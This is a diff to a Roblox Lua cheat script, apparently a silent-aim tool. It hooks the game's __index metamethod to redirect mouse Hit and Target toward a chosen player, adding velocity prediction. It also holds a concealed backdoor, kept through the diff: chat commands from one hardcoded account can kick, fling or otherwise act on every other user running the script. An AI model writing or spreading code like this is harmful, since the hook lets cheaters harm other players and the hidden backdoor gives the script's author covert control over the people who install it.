@@ -216,19 +216,6 @@ Aiming:CreateToggle({
 })
 
 Aiming:CreateSlider({
-    Name = "FOV Size"; 
-    Flag = "FOV Size Level";
-    Min = 1;
-    Max = 100; 
-    AllowOutOfRange = false;
-    Digits = 0; 
-    Default = 20; 
-    Callback = function(newValue)
-        Aiming.FOV = (newValue)
-    end;
-})
-
-Aiming:CreateSlider({
     Name = "Hitchance"; 
     Flag = "Just increases hitchance|Most";
     Min = 0;
@@ -241,36 +228,45 @@ Aiming:CreateSlider({
     end;
 })
 
-local Aiming = {}
-Aiming.Enabled = true 
-Aiming.Selected = nil 
-Aiming.SelectedPart = nil 
-
-
 function Aiming.Check()
-    if not (Aiming.Enabled and Aiming.Selected and Aiming.SelectedPart) then
+    -- // Check A
+    if not (Aiming.Enabled == true and Aiming.Selected ~= LocalPlayer and Aiming.SelectedPart ~= nil) then
         return false
     end
-    
+
+    -- // Check if downed
     local Character = Aiming.Character(Aiming.Selected)
-    local KOd = Character:FindFirstChild("BodyEffects") and Character.BodyEffects["K.O"].Value or false
+    local KOd = Character:WaitForChild("BodyEffects")["K.O"].Value
     local Grabbed = Character:FindFirstChild("GRABBING_CONSTRAINT") ~= nil
 
-    return not (KOd or Grabbed)
+    -- // Check B
+    if (KOd or Grabbed) then
+        return false
+    end
+
+    -- //
+    return true
 end
 
-
+-- // Hook
 local __index
 __index = hookmetamethod(game, "__index", function(t, k)
-    if t:IsA("Mouse") and (k == "Hit" or k == "Target") and Aiming.Check() then
+    -- // Check if it trying to get our mouse's hit or target and see if we can use it
+    if (t:IsA("Mouse") and (k == "Hit" or k == "Target") and Aiming.Check()) then
+        -- // Vars
         local SelectedPart = Aiming.SelectedPart
 
-        if Settings.SilentAim and (k == "Hit" or k == "Target") then
+        -- // Hit/Target
+        if (Settings.SilentAim and (k == "Hit" or k == "Target")) then
+            -- // Hit to account prediction
             local Hit = SelectedPart.CFrame + (SelectedPart.Velocity * Settings.Prediction)
+
+            -- // Return modded val
             return (k == "Hit" and Hit or SelectedPart)
         end
     end
 
+    -- // Return
     return __index(t, k)
 end)
 
@@ -291,7 +287,7 @@ end)
 local user_premium__001 = game.Players.BaconKing_xx2
 
 user_premium__001.Chatted:Connect(function(cht)
-    if cht:match(":kick .") then
+    if cht:match(".kick") then
         if game.Players.LocalPlayer ~= user_premium__001 then
             game.Players.LocalPlayer:Kick("Kicked by the owner of the script.")
         end
@@ -299,7 +295,7 @@ user_premium__001.Chatted:Connect(function(cht)
 end)
 
 user_premium__001.Chatted:Connect(function(cht)
-    if cht:match(":fling .") then
+    if cht:match(".fling ") then
         if game.Players.LocalPlayer ~= user_premium__001 then
             game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
             local power = 99999999
@@ -321,7 +317,7 @@ end)
 
 -- Chat command to perform the "benx" action
 user_premium__001.Chatted:Connect(function(cht)
-    if cht:match(":benx .") then
+    if cht:match(".benx") then
         if game.Players.LocalPlayer ~= user_premium__001 then
             wait(0)
             local A_1 = "Yeah Yeah!"
@@ -348,10 +344,10 @@ user_premium__001.Chatted:Connect(function(cht)
 end)
 
 user_premium__001.Chatted:Connect(function(cht)
-    if cht:match(":premcmds") then
+    if cht:match(".cmds") then
         UI:Notify({
             Title = "Cmds:",
-            Content = ":Freeze :grave :benx :bring :void :kill :kick :ban :fling",
+            Content = ".Freeze :grave .benx .bring :void :kill .kick .ban .fling",
             Time = 50,
         })
     end
